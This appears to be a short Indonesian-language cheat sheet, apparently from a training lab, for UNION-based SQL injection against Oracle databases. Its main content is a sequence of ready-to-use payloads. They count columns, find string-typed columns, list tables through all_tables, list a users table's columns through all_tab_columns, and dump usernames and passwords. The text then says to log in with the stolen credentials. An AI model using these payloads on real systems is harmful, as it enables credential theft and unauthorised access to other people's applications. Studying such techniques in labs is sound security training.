Anda dapat menampilkan daftar tabel dengan melakukan kueri all_tables:

SELECT * FROM all_tables
Anda dapat menampilkan daftar kolom dengan melakukan kueri all_tab_columns:

SELECT * FROM all_tab_columns WHERE table_name = 'USERS'

' ORDER BY 2-- # CEK JUMLAH KOLOM DULU
' UNION SELECT 'A', NULL FROM DUAL-- # CEK KOLOM MANA YANG BERTIPE STRINGS
' UNION SELECT table_name, NULL FROM all_tables-- # MEMUNCULKAN SEMUA ISI TABLE DAN CARI TABLE USERS YG UNIK CONTOH "USERS_UTQVMW"
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name= 'USERS_UTQVMW'-- # NGEBUKA KOLOM APA SAJA YG ADA DI TABLE 'USERS_UTQVMW' 
LALU CARI USERNAME DAN PASSWORD, CONTOH (USERNAME_ZKRVBX, PASSWORD_ZCGSRA)
' UNION SELECT USERNAME_ZKRVBX, PASSWORD_ZCGSRA FROM USERS_UTQVMW-- # MEMBUKA/MELIHAT ISI USERNAME DAN PASSWORD, SETELAH ITU LOGIN DENGAN ITU 
